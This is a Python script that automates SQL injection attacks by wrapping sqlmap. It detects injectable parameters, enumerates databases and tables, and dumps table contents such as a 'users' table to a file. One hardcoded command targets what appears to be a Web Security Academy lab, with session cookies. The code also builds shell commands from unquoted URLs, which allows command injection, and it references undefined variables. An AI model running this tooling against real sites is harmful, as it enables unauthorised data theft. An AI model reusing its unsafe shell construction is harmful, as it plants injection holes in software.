import subprocess

def scan_url_vulnerability(url):
	query = "sqlmap -u "+ url +" --batch"
	vuls=[]

	print(query)
	print("scanning vulnerability")
	process = subprocess.Popen([query],
						stdin=subprocess.PIPE,
						stdout=subprocess.PIPE, 
						stderr=subprocess.PIPE,
						shell = True, text = True)
	stdout, stderr = process.communicate()

	for x in range(len(stdout)):
		#get_time_starting
		if (stdout[x:(x+8)])== "starting":
			time_starting = stdout[(x+11):(x+19)]
			f = open("output.txt", "w")
			f.write("time_starting:" + time_starting)
			f.write("\n")
			f.close()
		#get_vulnerability
		if (stdout[x:(x+4)]) == "Type":
			if stdout[x+6] == "b":
				vuls.append("B")
			elif stdout[x+6] == "s":
				vuls.append("S")
			elif stdout[x+6] == "t":
				vuls.append("T")
			else:
				vuls.append(stdout[x+6])
		#get_time_ending
		if (stdout[x:(x+6)]) == "ending":
			time_ending = stdout[(x+9):(x+17)]

	f = open("output.txt", "a")
	for vul in vuls:
		f.write("vul:" + vul)
		f.write("\n")
	f.close()

	if len(vuls) == 0:
		f = open("output.txt", "a")
		f.write("time_ending:" + time_ending)
		f.close()
	
	return vuls		


def scan_url_database(url, tech, level):
	query = "sqlmap -u " + url + " --technique=" + tech + " --level " + level + " --dbs" + " --batch"
	dbs = []

	print(query)
	print("scanning databases")
	process = subprocess.Popen([query], 
						stdin=subprocess.PIPE,
						stdout=subprocess.PIPE,
						stderr=subprocess.PIPE,
						shell = True, text = True)
	stdout,stderr = process.communicate()
	

	for x in range(len(stdout)):
		if(stdout[x:(x+19)]) == "available databases":
			quantity_dbs = int(stdout[x+21])
			if(quantity_dbs == 1):
				for i in range((x+25), len(stdout), 1):
					if(stdout[i] == "\n"):
						dbs.append(stdout[(x+29):i])
						break
			else:
				getdb = 0
				i = x+19
				while(getdb < quantity_dbs):
					if(stdout[i] == "\n"):
						for j in range((i+6), len(stdout), 1):
							if(stdout[j] == "\n"):
								dbs.append(stdout[(i+5):j])
								break
						getdb += 1
						i += 1
					else:
						i += 1		

			if(len(dbs) == 0):
				f = open("output.txt", "a")
				f.write("dbs:null")
				f.write("\n")
				f.close()
			else:
				f = open("output.txt", "a")
				for db in dbs:
					f.write("dbs:" + db)
					f.write("\n")
				f.close()		
		if (stdout[x:(x+6)]) == "ending":
			time_ending = stdout[(x+9):(x+17)]

	if len(dbs) == 0:
		f = open("output.txt", "a")
		f.write("time_ending:" + time_ending)
		f.close()

	return dbs

def scan_url_tables(url, tech, level, db):
	query = "sqlmap -u " + url + " --technique=" + tech + " --level " + level + " -D " + db + " --tables" + " --batch"
	tables = []

	print(query)
	print("scanning tables")
	process = subprocess.Popen([query], 
						stdin=subprocess.PIPE,
						stdout=subprocess.PIPE,
						stderr=subprocess.PIPE,
						shell = True, text = True)
	stdout,stderr = process.communicate()


	for x in range(len(stdout)):
		str_search = "Database: " + db
		if stdout[x:(x+10+len(db))] == str_search:
			quantity_tables = int(stdout[x+12+len(db)])
			get_tb = 0
			i = (x+12+len(db))
			while(get_tb < quantity_tables):
				if stdout[i] == "|":
					for j in range((i+1), len(stdout), 1):
						if stdout[j] == "|":
							get_tb += 1
							table = stdout[(i+1):(j-1)]
							tables.append(table)
							i += (len(table)+3)
							break
				else:
					i+=1
		if (stdout[x:(x+6)]) == "ending":
			time_ending = stdout[(x+9):(x+17)]
			# print("time ending = " + time_ending)

	f = open("output.txt", "a")
	for i in range(len(tables)):
		print(tables[i].lstrip())
		f.write("table:" +tables[i].lstrip())
		f.write("\n")
	f.close()

	if len(tables) == 0:
		f = open("output.txt", "a")
		f.write("time_ending:" + time_ending)
		f.close()

	return tables

def scan_url_dump(url, tech, level, db, table):
	query = "sqlmap -u " + url + " --technique=" + tech + " --level " + level + " -D " + db + " -T " + table + " --dump" +" --batch"

	print(query)
	print("scanning content")
	process = subprocess.Popen([query], 
						stdin=subprocess.PIPE,
						stdout=subprocess.PIPE,
						stderr=subprocess.PIPE,
						shell = True, text = True)
	stdout,stderr = process.communicate()

	newspace = 0
	str_search = "Table: " + table
	for x in range(len(stdout)):
		if stdout[x:(x+7+len(table))] == str_search:
			for i in range(x, len(stdout),1):
				if stdout[i:(i+7)] == "entries":
					entries = int(stdout[(x+9+len(table)):(i-1)])
			for j in range(x, len(stdout), 1):
				if stdout[j] == "\n":
					newspace += 1
					if newspace == 2:
						start = j+1
					if newspace == (2+entries+1+3):
						end = j
						dump = stdout[start:end]
		if (stdout[x:(x+6)]) == "ending":
			time_ending = stdout[(x+9):(x+17)]
			# print("time ending = " + time_ending)	

	f = open("output.txt", "a")
	f.write(stdout[start:end])
	f.write("\n")
	f.close()
	
	f = open("output.txt", "a")
	f.write("time_ending:" + time_ending)
	f.write("\n")
	f.close()

	return dump


def scan_query_vulnerability(query):
	vuls = []

	print(query)
	print("scanning vulnerability")
	process = subprocess.Popen([query], 
						stdin=subprocess.PIPE,
						stdout=subprocess.PIPE,
						stderr=subprocess.PIPE,
						shell = True, text = True)
	stdout, stderr = process.communicate()
	
	for x in range(len(stdout)):
		#get_time_starting
		if (stdout[x:(x+8)])== "starting":
			time_starting = stdout[(x+11):(x+19)]
			f = open("output.txt", "a")
			f.write("time_starting:" + time_starting)
			f.write("\n")
			f.close()
			# print("time starting = " + time_starting)
			# get_vulnerability
		if (stdout[x:(x+4)]) == "Type":
			if stdout[x+6] == "b":
				vuls.append("B")
			elif stdout[x+6] == "s":
				vuls.append("S")
			elif stdout[x+6] == "t":
				vuls.append("T")
			else:
				vuls.append(stdout[x+6])
		if (stdout[x:(x+6)]) == "ending":
			time_ending = stdout[(x+9):(x+17)]
			# print("time ending = " + time_ending)

	f = open("output.txt", "a")
	for vul in vuls:
		f.write("vul:" + vul)
		f.write("\n")
	f.close()

	if len(vuls) == 0:
		f = open("output.txt", "a")
		f.write("time_ending:" + time_ending)
		f.close()		

	return vuls	

def scan_query_database(query):
	dbs = []

	print(query)
	print("scanning database")
	process = subprocess.Popen([query], 
						stdin=subprocess.PIPE,
						stdout=subprocess.PIPE,
						stderr=subprocess.PIPE,
						shell = True, text = True)
	stdout,stderr = process.communicate()
	

	for x in range(len(stdout)):
		if(stdout[x:(x+19)]) == "available databases":
			quantity_dbs = int(stdout[x+21])
			if(quantity_dbs == 1):
				for i in range((x+25), len(stdout), 1):
					if(stdout[i] == "\n"):
						dbs.append(stdout[(x+29):i])
						break
			else:
				getdb = 0
				i = x+19
				while(getdb < quantity_dbs):
					if(stdout[i] == "\n"):
						for j in range((i+6), len(stdout), 1):
							if(stdout[j] == "\n"):
								dbs.append(stdout[(i+5):j])
								break
						getdb += 1
						i += 1
					else:
						i += 1		

			if(len(dbs) == 0):
				f = open("output.txt", "a")
				f.write("dbs:null")
				f.write("\n")
				f.close()
			else:
				f = open("output.txt", "a")
				for db in dbs:
					f.write("dbs:" + db)
					f.write("\n")
				f.close()		
		if (stdout[x:(x+6)]) == "ending":
			time_ending = stdout[(x+9):(x+17)]

	if len(dbs) == 0:
		f = open("output.txt", "a")
		f.write("time_ending:" + time_ending)
		f.close()

	return dbs

def scan_query_tables(query):
	query = query
	tables = []

	print(query)
	print("scanning tables")


	process = subprocess.Popen([query], 
						stdin=subprocess.PIPE,
						stdout=subprocess.PIPE,
						stderr=subprocess.PIPE,
						shell = True, text = True)
	stdout,stderr = process.communicate()

	for x in range(len(stdout)):
		str_search = "Database: " + db
		if stdout[x:(x+10+len(db))] == str_search:
			quantity_tables = int(stdout[x+12+len(db)])
			get_tb = 0
			i = (x+12+len(db))
			while(get_tb < quantity_tables):
				if stdout[i] == "|":
					for j in range((i+1), len(stdout), 1):
						if stdout[j] == "|":
							get_tb += 1
							table = stdout[(i+1):(j-1)]
							tables.append(table)
							i += (len(table)+3)
							break
				else:
					i+=1
		if (stdout[x:(x+6)]) == "ending":
			time_ending = stdout[(x+9):(x+17)]

	f = open("output.txt", "a")
	for i in range(len(tables)):
		print(tables[i].lstrip())
		f.write("table:" +tables[i].lstrip())
		f.write("\n")
	f.close()

	if len(tables) == 0:
		f = open("output.txt", "a")
		f.write("time_ending:"  + time_ending)
		f.close()

	return tables

def scan_query_dump(query):

	print(query)
	print("scanning dump")

	process = subprocess.Popen([query], 
						stdin=subprocess.PIPE,
						stdout=subprocess.PIPE,
						stderr=subprocess.PIPE,
						shell = True, text = True)
	stdout,stderr = process.communicate()
	newspace = 0
	str_search = "Table: " + table
	for x in range(len(stdout)):
		if stdout[x:(x+7+len(table))] == str_search:
			for i in range(x, len(stdout),1):
				if stdout[i:(i+7)] == "entries":
					entries = int(stdout[(x+9+len(table)):(i-1)])
			for j in range(x, len(stdout), 1):
				if stdout[j] == "\n":
					newspace += 1
					if newspace == 2:
						start = j+1
					if newspace == (2+entries+1+3):
						end = j
						dump = stdout[start:end]
		if (stdout[x:(x+6)]) == "ending":
			time_ending = stdout[(x+9):(x+17)]

	f = open("output.txt", "a")
	f.write(stdout[start:end])
	f.write("\n")
	f.close()
	
	f = open("output.txt", "a")
	f.write("time_ending:" + time_ending)
	f.write("\n")
	f.close()

	return dump

def main():
	mode = 3
	level = ["2", "3", "4", "5"]
	if(mode == 1):
		f = open("input.txt", "r")
		url =  f.read()
		f.close()

		vuls = scan_url_vulnerability(url)
		if len(vuls) == 0:
			print("The website has not sql injection vulnerability")
		else:
			dbs = scan_url_database(url, vuls[0], level[0])
		if len(dbs) == 0:
			print("we can not scan databases")
		else:
			tables = scan_url_tables(url, vuls[0], level[0], dbs[0])
		if len(tables) == 0:
			print("we can not scan tables")
		else:
			dump = scan_url_dump(url, vuls[0],level[0], dbs[0], tables[0])
	if(mode == 2):
		query = 'sqlmap -u https://0a4900570425c01dc0470466006f00b2.web-security-academy.net/filter?category=Corporate+gifts --cookie="TrackingId=29PMYUHjgNUKvmwI; session=3zGP0MQtrqEMxU10ZH7KPlM48JC9ZfZ0" --level 2 -technique=B --dbs --batch'
		# query = 'sqlmap -u https://0a4900570425c01dc0470466006f00b2.web-security-academy.net/filter?category=Corporate+gifts --cookie="TrackingId=29PMYUHjgNUKvmwI; session=3zGP0MQtrqEMxU10ZH7KPlM48JC9ZfZ0" --level 2 --technique=B -D public -T users --dump --batch'
		dbs = scan_query_database(query)
	if(mode == 3):
		db = "public"
		table = "users"
		print("test")

		sqlmap = {
			"url": "",
			"message": "",
			"vulnerability": ["", ""],
			"databases": "",
			"tables": ["", ""],
			"dump": ""
		}


		print(sqlmap)
		# dump = get_dump(table)

if __name__ == "__main__":
	main()